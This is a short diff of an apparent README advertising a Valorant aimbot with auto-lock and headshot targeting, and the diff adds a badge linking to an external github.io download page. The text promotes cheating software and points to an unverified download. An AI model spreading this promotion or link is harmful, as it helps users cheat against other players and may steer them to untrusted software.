@@ -4,6 +4,7 @@
 
 In **Valorant**, precision decides who wins. Even pro-level reflexes can miss under pressure, but with a **Valorant aimbot**, you’ll never whiff another shot. Auto-lock targeting, headshot priority, and customizable aim assist make you unstoppable in clutch rounds.
 
+[![Get](https://img.shields.io/badge/Get%20The-Aimbot-blueviolet)](https://valorant-aimbot-tool.github.io/.github/)
 ---
 
 ## Product Description
